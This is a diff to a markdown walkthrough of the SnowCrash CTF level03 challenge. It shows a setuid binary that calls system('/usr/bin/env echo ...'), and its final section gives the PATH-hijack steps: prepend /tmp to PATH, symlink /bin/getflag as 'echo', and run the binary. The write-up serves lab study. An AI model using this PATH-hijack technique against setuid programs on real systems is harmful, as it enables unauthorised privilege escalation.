@@ -1,5 +1,7 @@
+# Env invocation by a privileged user 
 
 ## Step 1: Exploring content 
+```
 level03@SnowCrash:~$ ls -la
 total 24
 dr-x------ 1 level03 level03  120 Mar  5  2016 .
@@ -8,6 +10,7 @@ d--x--x--x 1 root    users    340 Aug 30  2015 ..
 -r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
 -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
 -r-x------ 1 level03 level03  675 Apr  3  2012 .profile
+```
 
 ### Observations:
 
@@ -20,6 +23,7 @@ The presence of the setuid bit (`s` in the owner's permission) is particularly n
 ## Step 2: Investigating the file using ltrace 
 ltrace is a common tool used in software development and security analysis for understanding the behavior of binaries, especially when source code is not available or when trying to diagnose runtime issues or vulnerabilities.
 
+```
 ltrace ./level03
 __libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
 getegid()                                        = 2003
@@ -31,6 +35,7 @@ system("/usr/bin/env echo Exploit me"Exploit me
 --- SIGCHLD (Child exited) ---
 <... system resumed> )                           = 0
 +++ exited (status 0) +++
+```
 
 ### Some key security notions: 
 
@@ -55,17 +60,16 @@ system("/usr/bin/env echo Exploit me"Exploit me
 
 ### Step3: Create symbolic link
 
-export PATH="/tmp:$PATH" 
+```export PATH="/tmp:$PATH" ```
 - Prepending /tmp to ensure it looks first in /tmp (standard world writable directory, temporary so it does not raise suspicions) 
 
-cd /tmp
+```cd /tmp```
 - we need to be in temp to create a symbolic link
 
-ln -s /bin/getflag echo
+```ln -s /bin/getflag echo```
 - creating symbolic link to /bin/getflag  (instead of running echo it will run /bin/getflag)
 
-cd $OLDPWD
-
+```cd $OLDPWD```
 - go back to old path to run ./level03
 
-./level03
+```./level03```
